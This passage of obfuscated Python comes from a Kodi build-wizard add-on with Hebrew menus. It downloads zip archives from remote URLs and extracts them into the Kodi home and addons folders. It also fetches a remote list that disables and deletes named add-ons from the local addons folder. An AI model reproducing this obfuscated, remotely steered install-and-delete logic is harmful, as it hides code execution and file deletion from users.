		if O0OO0OO0O000OO0O0 ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5083
		elif len (O0OO0OO0O000OO0O0 )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5084
		else :#line:5085
			for O00OO0O0OOOO0OOO0 in O0OO0OO0O000OO0O0 :wiz .purgeDb (O00000OOO00O000OO [O00OO0O0OOOO0OOO0 ])#line:5086
	else :#line:5087
		O0OO0OO0O000OO0O0 =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O0O0O0O00OOOOOO00 )#line:5088
		if O0OO0OO0O000OO0O0 ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5089
		else :wiz .purgeDb (O00000OOO00O000OO [O00OO0O0OOOO0OOO0 ])#line:5090
def fastupdatefirstbuild (O000O00O0O0OO000O ):#line:5096
	wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5098
	if ENABLE =='Yes':#line:5099
		if not NOTIFY =='true':#line:5100
			OO0O00OO0OO000OOO =wiz .workingURL (NOTIFICATION )#line:5101
			if OO0O00OO0OO000OOO ==True :#line:5102
				OOO0OO0O00O0OO0OO ,O000O0OO00O0OO0OO =wiz .splitNotify (NOTIFICATION )#line:5103
				if not OOO0OO0O00O0OO0OO ==False :#line:5105
					try :#line:5106
						OOO0OO0O00O0OO0OO =int (OOO0OO0O00O0OO0OO );O000O00O0O0OO000O =int (O000O00O0O0OO000O )#line:5107
						checkidupdate ()#line:5108
						wiz .setS ("notedismiss","true")#line:5109
						if OOO0OO0O00O0OO0OO ==O000O00O0O0OO000O :#line:5110
							wiz .log ("[Notifications] id[%s] Dismissed"%int (OOO0OO0O00O0OO0OO ),xbmc .LOGNOTICE )#line:5111
						elif OOO0OO0O00O0OO0OO >O000O00O0O0OO000O :#line:5113
							wiz .log ("[Notifications] id: %s"%str (OOO0OO0O00O0OO0OO ),xbmc .LOGNOTICE )#line:5114
							wiz .setS ('noteid',str (OOO0OO0O00O0OO0OO ))#line:5115
							wiz .setS ("notedismiss","true")#line:5116
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5119
					except Exception as O00O0OO00OO00OO0O :#line:5120
						wiz .log ("Error on Notifications Window: %s"%str (O00O0OO00OO00OO0O ),xbmc .LOGERROR )#line:5121
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5123
			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,OO0O00OO0OO000OOO ),xbmc .LOGNOTICE )#line:5124
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5125
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:5126
def checkidupdate ():#line:5132
				wiz .setS ("notedismiss","true")#line:5134
				O0O00OOOO0OO0OO0O =wiz .workingURL (NOTIFICATION )#line:5135
				O0O0O0OOOOOOOO000 =" Kodi Premium"#line:5137
				O0OO0OOO00000O000 =wiz .checkBuild (O0O0O0OOOOOOOO000 ,'gui')#line:5138
				O00O00OOO000O00OO =O0O0O0OOOOOOOO000 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5139
				if not wiz .workingURL (O0OO0OOO00000O000 )==True :return #line:5140
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5141
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,O0O0O0OOOOOOOO000 ),'','אנא המתן')#line:5142
				O0000O00O000OOOO0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%O00O00OOO000O00OO )#line:5143
				try :os .remove (O0000O00O000OOOO0 )#line:5144
				except :pass #line:5145
				logging .warning (O0OO0OOO00000O000 )#line:5146
				if 'google'in O0OO0OOO00000O000 :#line:5147
				   O0O0OO0OOO0O0OOOO =googledrive_download (O0OO0OOO00000O000 ,O0000O00O000OOOO0 ,DP ,wiz .checkBuild (O0O0O0OOOOOOOO000 ,'filesize'))#line:5148
				else :#line:5151
				  downloader .download (O0OO0OOO00000O000 ,O0000O00O000OOOO0 ,DP )#line:5152
				xbmc .sleep (100 )#line:5153
				O0000000O000OOOOO ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O0O0OOOOOOOO000 )#line:5154
				DP .update (0 ,O0000000O000OOOOO ,'','אנא המתן')#line:5155
				extract .all (O0000O00O000OOOO0 ,HOME ,DP ,title =O0000000O000OOOOO )#line:5156
				DP .close ()#line:5157
				wiz .defaultSkin ()#line:5158
				wiz .lookandFeelData ('save')#line:5159
				if KODIV >=18 :#line:5160
					skindialogsettind18 ()#line:5161
				if INSTALLMETHOD ==1 :OO00O0OO00OO00OOO =1 #line:5164
				elif INSTALLMETHOD ==2 :OO00O0OO00OO00OOO =0 #line:5165
				else :DP .close ()#line:5166
def gaiaserenaddon ():#line:5168
  OOOOOOOO0000OO0OO =(ADDON .getSetting ("gaiaseren"))#line:5169
  O00000000OOO00OOO =(ADDON .getSetting ("auto_rd"))#line:5170
  if OOOOOOOO0000OO0OO =='true'and O00000000OOO00OOO =='true':#line:5171
    O0OO00000O00O0O0O =(NEWFASTUPDATE )#line:5172
    O00O0OO0O0O00O00O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5173
    O00OOOO0OO0000OO0 =xbmcgui .DialogProgress ()#line:5174
    O00OOOO0OO0000OO0 .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5175
    O0OO00OO0O00O00O0 =os .path .join (PACKAGES ,'isr.zip')#line:5176
    OO000OOOOO0OOO0O0 =urllib2 .Request (O0OO00000O00O0O0O )#line:5177
    O0O0O0OO00OOOO00O =urllib2 .urlopen (OO000OOOOO0OOO0O0 )#line:5178
    OO0O00O0000000OOO =xbmcgui .DialogProgress ()#line:5180
    OO0O00O0000000OOO .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5181
    OO0O00O0000000OOO .update (0 )#line:5182
    O000O0000OOOOOOOO =open (O0OO00OO0O00O00O0 ,'wb')#line:5184
    try :#line:5186
      O0OOO0O00O000OO0O =O0O0O0OO00OOOO00O .info ().getheader ('Content-Length').strip ()#line:5187
      OO0OOO00O00OOO000 =True #line:5188
    except AttributeError :#line:5189
          OO0OOO00O00OOO000 =False #line:5190
    if OO0OOO00O00OOO000 :#line:5192
          O0OOO0O00O000OO0O =int (O0OOO0O00O000OO0O )#line:5193
    O0OO000O0O0OOOO00 =0 #line:5195
    OO0OOO00OOOO0O0O0 =time .time ()#line:5196
    while True :#line:5197
          O0O000000OOOO0O00 =O0O0O0OO00OOOO00O .read (8192 )#line:5198
          if not O0O000000OOOO0O00 :#line:5199
              sys .stdout .write ('\n')#line:5200
              break #line:5201
          O0OO000O0O0OOOO00 +=len (O0O000000OOOO0O00 )#line:5203
          O000O0000OOOOOOOO .write (O0O000000OOOO0O00 )#line:5204
          if not OO0OOO00O00OOO000 :#line:5206
              O0OOO0O00O000OO0O =O0OO000O0O0OOOO00 #line:5207
          if OO0O00O0000000OOO .iscanceled ():#line:5208
             OO0O00O0000000OOO .close ()#line:5209
             try :#line:5210
              os .remove (O0OO00OO0O00O00O0 )#line:5211
             except :#line:5212
              pass #line:5213
             break #line:5214
          O0OOO00O000O0OO0O =float (O0OO000O0O0OOOO00 )/O0OOO0O00O000OO0O #line:5215
          O0OOO00O000O0OO0O =round (O0OOO00O000O0OO0O *100 ,2 )#line:5216
          O0O0O0O0OOOOOOOOO =O0OO000O0O0OOOO00 /(1024 *1024 )#line:5217
          O00OOOOOOOOOO0O00 =O0OOO0O00O000OO0O /(1024 *1024 )#line:5218
          O0OO0000OO0OOOOOO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0O0O0O0OOOOOOOOO ,'teal',O00OOOOOOOOOO0O00 )#line:5219
          if (time .time ()-OO0OOO00OOOO0O0O0 )>0 :#line:5220
            O0OOO0OO0O0OOOO00 =O0OO000O0O0OOOO00 /(time .time ()-OO0OOO00OOOO0O0O0 )#line:5221
            O0OOO0OO0O0OOOO00 =O0OOO0OO0O0OOOO00 /1024 #line:5222
          else :#line:5223
           O0OOO0OO0O0OOOO00 =0 #line:5224
          O0OO00OO00OO00000 ='KB'#line:5225
          if O0OOO0OO0O0OOOO00 >=1024 :#line:5226
             O0OOO0OO0O0OOOO00 =O0OOO0OO0O0OOOO00 /1024 #line:5227
             O0OO00OO00OO00000 ='MB'#line:5228
          if O0OOO0OO0O0OOOO00 >0 and not O0OOO00O000O0OO0O ==100 :#line:5229
              OO0000OO0O0OOO000 =(O0OOO0O00O000OO0O -O0OO000O0O0OOOO00 )/O0OOO0OO0O0OOOO00 #line:5230
          else :#line:5231
              OO0000OO0O0OOO000 =0 #line:5232
          O0000O000O0O000OO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0OOO0OO0O0OOOO00 ,O0OO00OO00OO00000 )#line:5233
          OO0O00O0000000OOO .update (int (O0OOO00O000O0OO0O ),O0OO0000OO0OOOOOO ,O0000O000O0O000OO +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5235
    OOO000O0OO0OO00OO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5238
    O000O0000OOOOOOOO .close ()#line:5241
    extract .all (O0OO00OO0O00O00O0 ,OOO000O0OO0OO00OO ,OO0O00O0000000OOO )#line:5242
    try :#line:5246
      os .remove (O0OO00OO0O00O00O0 )#line:5247
    except :#line:5248
      pass #line:5249
def iptvsimpldownpc ():#line:5250
    OOOO00OOOOOOO0OO0 =(IPTVSIMPL18PC )#line:5252
    O00O0O0O0OO0OO000 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5253
    O0000000OO0O0OOO0 =xbmcgui .DialogProgress ()#line:5254
    O0000000OO0O0OOO0 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5255
    O0O000000OOOOOO00 =os .path .join (PACKAGES ,'isr.zip')#line:5256
    OO0O00OO0OO0O0000 =urllib2 .Request (OOOO00OOOOOOO0OO0 )#line:5257
    OOO0O0O00O0000O0O =urllib2 .urlopen (OO0O00OO0OO0O0000 )#line:5258
    OO0O000O0O0O00OOO =xbmcgui .DialogProgress ()#line:5260
    OO0O000O0O0O00OOO .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5261
    OO0O000O0O0O00OOO .update (0 )#line:5262
    O0OO0O0O0O00O0000 =open (O0O000000OOOOOO00 ,'wb')#line:5264
    try :#line:5266
      O00O0O00OO00O000O =OOO0O0O00O0000O0O .info ().getheader ('Content-Length').strip ()#line:5267
      OO0OO0000000O0O00 =True #line:5268
    except AttributeError :#line:5269
          OO0OO0000000O0O00 =False #line:5270
    if OO0OO0000000O0O00 :#line:5272
          O00O0O00OO00O000O =int (O00O0O00OO00O000O )#line:5273
    OOOO00O0OOOO00000 =0 #line:5275
    OO00O00O0O00O00OO =time .time ()#line:5276
    while True :#line:5277
          OOOOO0000OO000O0O =OOO0O0O00O0000O0O .read (8192 )#line:5278
          if not OOOOO0000OO000O0O :#line:5279
              sys .stdout .write ('\n')#line:5280
              break #line:5281
          OOOO00O0OOOO00000 +=len (OOOOO0000OO000O0O )#line:5283
          O0OO0O0O0O00O0000 .write (OOOOO0000OO000O0O )#line:5284
          if not OO0OO0000000O0O00 :#line:5286
              O00O0O00OO00O000O =OOOO00O0OOOO00000 #line:5287
          if OO0O000O0O0O00OOO .iscanceled ():#line:5288
             OO0O000O0O0O00OOO .close ()#line:5289
             try :#line:5290
              os .remove (O0O000000OOOOOO00 )#line:5291
             except :#line:5292
              pass #line:5293
             break #line:5294
          O0O00OOO00OOO0000 =float (OOOO00O0OOOO00000 )/O00O0O00OO00O000O #line:5295
          O0O00OOO00OOO0000 =round (O0O00OOO00OOO0000 *100 ,2 )#line:5296
          OOOO0OO0O0OOOO0OO =OOOO00O0OOOO00000 /(1024 *1024 )#line:5297
          O000000O000O00000 =O00O0O00OO00O000O /(1024 *1024 )#line:5298
          O0O0O000OOO0OOOOO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOOO0OO0O0OOOO0OO ,'teal',O000000O000O00000 )#line:5299
          if (time .time ()-OO00O00O0O00O00OO )>0 :#line:5300
            OO0000O0OO0O0OOO0 =OOOO00O0OOOO00000 /(time .time ()-OO00O00O0O00O00OO )#line:5301
            OO0000O0OO0O0OOO0 =OO0000O0OO0O0OOO0 /1024 #line:5302
          else :#line:5303
           OO0000O0OO0O0OOO0 =0 #line:5304
          O00000O0O0000O00O ='KB'#line:5305
          if OO0000O0OO0O0OOO0 >=1024 :#line:5306
             OO0000O0OO0O0OOO0 =OO0000O0OO0O0OOO0 /1024 #line:5307
             O00000O0O0000O00O ='MB'#line:5308
          if OO0000O0OO0O0OOO0 >0 and not O0O00OOO00OOO0000 ==100 :#line:5309
              OO0OO0OOO0000OOO0 =(O00O0O00OO00O000O -OOOO00O0OOOO00000 )/OO0000O0OO0O0OOO0 #line:5310
          else :#line:5311
              OO0OO0OOO0000OOO0 =0 #line:5312
          O0OOOOO0O0000O0OO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO0000O0OO0O0OOO0 ,O00000O0O0000O00O )#line:5313
          OO0O000O0O0O00OOO .update (int (O0O00OOO00OOO0000 ),O0O0O000OOO0OOOOO ,O0OOOOO0O0000O0OO +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5315
    O0OO0000OOO0000OO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5318
    O0OO0O0O0O00O0000 .close ()#line:5321
    extract .all (O0O000000OOOOOO00 ,O0OO0000OOO0000OO ,OO0O000O0O0O00OOO )#line:5322
    try :#line:5326
      os .remove (O0O000000OOOOOO00 )#line:5327
    except :#line:5328
      pass #line:5329
def iptvsimpldown ():#line:5330
    O0O0O0000O0O0O00O =(IPTVSIMPL18 )#line:5332
    OO0OOOOO000OO000O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5333
    OOOOO000O000O000O =xbmcgui .DialogProgress ()#line:5334
    OOOOO000O000O000O .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5335
    O00O0000O0OO00OOO =os .path .join (PACKAGES ,'isr.zip')#line:5336
    OOOOO0OOO0OOO00O0 =urllib2 .Request (O0O0O0000O0O0O00O )#line:5337
    OOO00OOOO00O0O000 =urllib2 .urlopen (OOOOO0OOO0OOO00O0 )#line:5338
    OO0O00000O00000O0 =xbmcgui .DialogProgress ()#line:5340
    OO0O00000O00000O0 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5341
    OO0O00000O00000O0 .update (0 )#line:5342
    OO0O00O0O0OO0O0OO =open (O00O0000O0OO00OOO ,'wb')#line:5344
    try :#line:5346
      O000O0OO00OO000O0 =OOO00OOOO00O0O000 .info ().getheader ('Content-Length').strip ()#line:5347
      OOO00O00OOO0O0O00 =True #line:5348
    except AttributeError :#line:5349
          OOO00O00OOO0O0O00 =False #line:5350
    if OOO00O00OOO0O0O00 :#line:5352
          O000O0OO00OO000O0 =int (O000O0OO00OO000O0 )#line:5353
    O000O00OO000OOO0O =0 #line:5355
    O00O00O0OO0000O0O =time .time ()#line:5356
    while True :#line:5357
          O0OO00OOO0000O0O0 =OOO00OOOO00O0O000 .read (8192 )#line:5358
          if not O0OO00OOO0000O0O0 :#line:5359
              sys .stdout .write ('\n')#line:5360
              break #line:5361
          O000O00OO000OOO0O +=len (O0OO00OOO0000O0O0 )#line:5363
          OO0O00O0O0OO0O0OO .write (O0OO00OOO0000O0O0 )#line:5364
          if not OOO00O00OOO0O0O00 :#line:5366
              O000O0OO00OO000O0 =O000O00OO000OOO0O #line:5367
          if OO0O00000O00000O0 .iscanceled ():#line:5368
             OO0O00000O00000O0 .close ()#line:5369
             try :#line:5370
              os .remove (O00O0000O0OO00OOO )#line:5371
             except :#line:5372
              pass #line:5373
             break #line:5374
          OO00O0OOO0OO0O00O =float (O000O00OO000OOO0O )/O000O0OO00OO000O0 #line:5375
          OO00O0OOO0OO0O00O =round (OO00O0OOO0OO0O00O *100 ,2 )#line:5376
          OO00O0O00000O0O0O =O000O00OO000OOO0O /(1024 *1024 )#line:5377
          O0O0O00OO0OO0O0OO =O000O0OO00OO000O0 /(1024 *1024 )#line:5378
          OO000O00O00000000 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO00O0O00000O0O0O ,'teal',O0O0O00OO0OO0O0OO )#line:5379
          if (time .time ()-O00O00O0OO0000O0O )>0 :#line:5380
            OO0O00O0OOO0OOOO0 =O000O00OO000OOO0O /(time .time ()-O00O00O0OO0000O0O )#line:5381
            OO0O00O0OOO0OOOO0 =OO0O00O0OOO0OOOO0 /1024 #line:5382
          else :#line:5383
           OO0O00O0OOO0OOOO0 =0 #line:5384
          OO0OOO0OOOO00O00O ='KB'#line:5385
          if OO0O00O0OOO0OOOO0 >=1024 :#line:5386
             OO0O00O0OOO0OOOO0 =OO0O00O0OOO0OOOO0 /1024 #line:5387
             OO0OOO0OOOO00O00O ='MB'#line:5388
          if OO0O00O0OOO0OOOO0 >0 and not OO00O0OOO0OO0O00O ==100 :#line:5389
              OO00O00OO0OO00OO0 =(O000O0OO00OO000O0 -O000O00OO000OOO0O )/OO0O00O0OOO0OOOO0 #line:5390
          else :#line:5391
              OO00O00OO0OO00OO0 =0 #line:5392
          O0OO0O0OO0OOO0000 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO0O00O0OOO0OOOO0 ,OO0OOO0OOOO00O00O )#line:5393
          OO0O00000O00000O0 .update (int (OO00O0OOO0OO0O00O ),OO000O00O00000000 ,O0OO0O0OO0OOO0000 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5395
    OO0OOO0O00000O0O0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5398
    OO0O00O0O0OO0O0OO .close ()#line:5401
    extract .all (O00O0000O0OO00OOO ,OO0OOO0O00000O0O0 ,OO0O00000O00000O0 )#line:5402
    try :#line:5406
      os .remove (O00O0000O0OO00OOO )#line:5407
    except :#line:5408
      pass #line:5409
def testnotify ():#line:5410
	O0OO0000O0O0OO00O =wiz .workingURL (NOTIFICATION )#line:5411
	if O0OO0000O0O0OO00O ==True :#line:5412
		try :#line:5413
			O0O00OO000OO0OO0O ,OOO00OO0O00O0OOO0 =wiz .splitNotify (NOTIFICATION )#line:5414
			if O0O00OO000OO0OO0O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5415
			if STARTP2 ()=='ok':#line:5416
				notify .notification (OOO00OO0O00O0OOO0 ,True )#line:5417
		except Exception as O00OO000O0O0O00OO :#line:5418
			wiz .log ("Error on Notifications Window: %s"%str (O00OO000O0O0O00OO ),xbmc .LOGERROR )#line:5419
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5420
def testnotify2 ():#line:5421
	OOOOO0O0O0OOO0000 =wiz .workingURL (NOTIFICATION2 )#line:5422
	if OOOOO0O0O0OOO0000 ==True :#line:5423
		try :#line:5424
			O000000O00O0OOOO0 ,O00O0OOOO00O0OO0O =wiz .splitNotify (NOTIFICATION2 )#line:5425
			if O000000O00O0OOOO0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5426
			if STARTP2 ()=='ok':#line:5427
				notify .notification2 (O00O0OOOO00O0OO0O ,True )#line:5428
		except Exception as O000O0O0OO0O00O00 :#line:5429
			wiz .log ("Error on Notifications Window: %s"%str (O000O0O0OO0O00O00 ),xbmc .LOGERROR )#line:5430
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5431
def testnotify3 ():#line:5432
	O0OOO0OOO00O0O0OO =wiz .workingURL (NOTIFICATION3 )#line:5433
	if O0OOO0OOO00O0O0OO ==True :#line:5434
		try :#line:5435
			O000000OOOO00OO0O ,O0OO0000O00O0OO0O =wiz .splitNotify (NOTIFICATION3 )#line:5436
			if O000000OOOO00OO0O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5437
			if STARTP2 ()=='ok':#line:5438
				notify .notification3 (O0OO0000O00O0OO0O ,True )#line:5439
		except Exception as O0000OOOOOO00000O :#line:5440
			wiz .log ("Error on Notifications Window: %s"%str (O0000OOOOOO00000O ),xbmc .LOGERROR )#line:5441
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5442
def servicemanual ():#line:5443
	O0O00OOO0000OO000 =wiz .workingURL (HELPINFO )#line:5444
	if O0O00OOO0000OO000 ==True :#line:5445
		try :#line:5446
			O0000O0O0O0000OO0 ,OO000O0O0O0OOO0O0 =wiz .splitNotify (HELPINFO )#line:5447
			if O0000O0O0O0000OO0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:5448
			notify .helpinfo (OO000O0O0O0OOO0O0 ,True )#line:5449
		except Exception as O0O0000O000OO000O :#line:5450
			wiz .log ("Error on Notifications Window: %s"%str (O0O0000O000OO000O ),xbmc .LOGERROR )#line:5451
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:5452
def testupdate ():#line:5454
	if BUILDNAME =="":#line:5455
		notify .updateWindow ()#line:5456
	else :#line:5457
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:5458
def testfirst ():#line:5460
	notify .firstRun ()#line:5461
def testfirstRun ():#line:5463
	notify .firstRunSettings ()#line:5464
def fastinstall ():#line:5467
	notify .firstRuninstall ()#line:5468
def addDir (O00O00000OO0O0O0O ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5475
	O00O00000OO000000 =sys .argv [0 ]#line:5476
	if not mode ==None :O00O00000OO000000 +="?mode=%s"%urllib .quote_plus (mode )#line:5477
	if not name ==None :O00O00000OO000000 +="&name="+urllib .quote_plus (name )#line:5478
	if not url ==None :O00O00000OO000000 +="&url="+urllib .quote_plus (url )#line:5479
	O00000OO00O0O0000 =True #line:5480
	if themeit :O00O00000OO0O0O0O =themeit %O00O00000OO0O0O0O #line:5481
	OOOOOOOOO00OOOOOO =xbmcgui .ListItem (O00O00000OO0O0O0O ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5482
	OOOOOOOOO00OOOOOO .setInfo (type ="Video",infoLabels ={"Title":O00O00000OO0O0O0O ,"Plot":description })#line:5483
	OOOOOOOOO00OOOOOO .setProperty ("Fanart_Image",fanart )#line:5484
	if not menu ==None :OOOOOOOOO00OOOOOO .addContextMenuItems (menu ,replaceItems =overwrite )#line:5485
	O00000OO00O0O0000 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O00O00000OO000000 ,listitem =OOOOOOOOO00OOOOOO ,isFolder =True )#line:5486
	return O00000OO00O0O0000 #line:5487
def addFile (O00OOO00OO000O0O0 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5489
	O00OO00O0O0OOOO00 =sys .argv [0 ]#line:5490
	if not mode ==None :O00OO00O0O0OOOO00 +="?mode=%s"%urllib .quote_plus (mode )#line:5491
	if not name ==None :O00OO00O0O0OOOO00 +="&name="+urllib .quote_plus (name )#line:5492
	if not url ==None :O00OO00O0O0OOOO00 +="&url="+urllib .quote_plus (url )#line:5493
	O0O0O00O0OO000O00 =True #line:5494
	if themeit :O00OOO00OO000O0O0 =themeit %O00OOO00OO000O0O0 #line:5495
	OOOO0O00O0OO00000 =xbmcgui .ListItem (O00OOO00OO000O0O0 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5496
	OOOO0O00O0OO00000 .setInfo (type ="Video",infoLabels ={"Title":O00OOO00OO000O0O0 ,"Plot":description })#line:5497
	OOOO0O00O0OO00000 .setProperty ("Fanart_Image",fanart )#line:5498
	if not menu ==None :OOOO0O00O0OO00000 .addContextMenuItems (menu ,replaceItems =overwrite )#line:5499
	O0O0O00O0OO000O00 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O00OO00O0O0OOOO00 ,listitem =OOOO0O00O0OO00000 ,isFolder =False )#line:5500
	return O0O0O00O0OO000O00 #line:5501
def get_params ():#line:5503
	OOO0O0O000000O000 =[]#line:5504
	OOO00OO0OOO0OOO00 =sys .argv [2 ]#line:5505
	if len (OOO00OO0OOO0OOO00 )>=2 :#line:5506
		O0O00OO0OO0O0O0O0 =sys .argv [2 ]#line:5507
		O00OO000O0OOO0000 =O0O00OO0OO0O0O0O0 .replace ('?','')#line:5508
		if (O0O00OO0OO0O0O0O0 [len (O0O00OO0OO0O0O0O0 )-1 ]=='/'):#line:5509
			O0O00OO0OO0O0O0O0 =O0O00OO0OO0O0O0O0 [0 :len (O0O00OO0OO0O0O0O0 )-2 ]#line:5510
		OOOOO0OO0O0OOOOO0 =O00OO000O0OOO0000 .split ('&')#line:5511
		OOO0O0O000000O000 ={}#line:5512
		for O0O0OOOOOO0OO0OO0 in range (len (OOOOO0OO0O0OOOOO0 )):#line:5513
			OO0O0000OOOO00OO0 ={}#line:5514
			OO0O0000OOOO00OO0 =OOOOO0OO0O0OOOOO0 [O0O0OOOOOO0OO0OO0 ].split ('=')#line:5515
			if (len (OO0O0000OOOO00OO0 ))==2 :#line:5516
				OOO0O0O000000O000 [OO0O0000OOOO00OO0 [0 ]]=OO0O0000OOOO00OO0 [1 ]#line:5517
		return OOO0O0O000000O000 #line:5519
def remove_addons ():#line:5521
	try :#line:5522
			import json #line:5523
			O0O000O0O0000O00O =urllib2 .urlopen (remove_url ).readlines ()#line:5524
			for OO00O0O00O00O000O in O0O000O0O0000O00O :#line:5525
				OO000O0OO0O000O00 =OO00O0O00O00O000O .split (':')[1 ].strip ()#line:5527
				OO00OO0O0O00O00OO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(OO000O0OO0O000O00 ,'false')#line:5528
				OO0OO000O0OOOOO0O =xbmc .executeJSONRPC (OO00OO0O0O00O00OO )#line:5529
				O000OOO0000000O0O =json .loads (OO0OO000O0OOOOO0O )#line:5530
				O00OOOOO0OOOOOOO0 =os .path .join (addons_folder ,OO000O0OO0O000O00 )#line:5532
				if os .path .exists (O00OOOOO0OOOOOOO0 ):#line:5534
					for O00O00OO00OOOO00O ,O0000OOO000OO0O0O ,OOO00O00O0O0OOOOO in os .walk (O00OOOOO0OOOOOOO0 ):#line:5535
						for OO0O0OO00O00O00OO in OOO00O00O0O0OOOOO :#line:5536
							os .unlink (os .path .join (O00O00OO00OOOO00O ,OO0O0OO00O00O00OO ))#line:5537
						for OO00O0OO0OOO00O0O in O0000OOO000OO0O0O :#line:5538
							shutil .rmtree (os .path .join (O00O00OO00OOOO00O ,OO00O0OO0OOO00O0O ))#line:5539
					os .rmdir (O00OOOOO0OOOOOOO0 )#line:5540
			xbmc .executebuiltin ('Container.Refresh')#line:5542
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:5543
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:5544
	except :pass #line:5545
def remove_addons2 ():#line:5546
	try :#line:5547
			import json #line:5548
